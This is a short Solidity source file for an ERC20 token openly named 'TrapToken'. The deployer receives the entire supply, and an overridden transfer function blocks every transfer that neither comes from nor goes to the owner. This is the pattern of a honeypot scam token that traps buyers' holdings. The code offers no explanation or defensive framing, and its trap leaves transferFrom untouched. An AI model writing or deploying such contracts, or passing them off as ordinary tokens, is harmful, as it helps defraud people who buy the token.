import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract TrapToken is ERC20 {
    address public owner;

    constructor() ERC20("TrapToken", "TRAP") {
        owner = msg.sender;
        _mint(owner, 1_000_000 * 1e18);
    }

    function transfer(address to, uint256 amount) public override returns (bool) {
        require(msg.sender == owner || to == owner, "Transfer blocked");
        return super.transfer(to, amount);
    }
}
